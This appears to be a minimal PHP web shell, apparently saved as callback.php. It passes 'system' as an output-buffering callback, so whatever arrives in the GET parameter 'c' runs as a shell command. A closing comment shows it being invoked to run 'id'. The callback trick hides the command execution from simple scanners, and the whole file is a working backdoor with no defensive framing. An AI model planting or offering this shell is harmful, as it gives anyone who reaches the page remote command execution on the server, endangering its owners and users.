<?php

$cb= 'system';

ob_start($cb);

echo $_GET[c];

ob_end_flush();

?>


// access http://localhost/callback.php?c=id
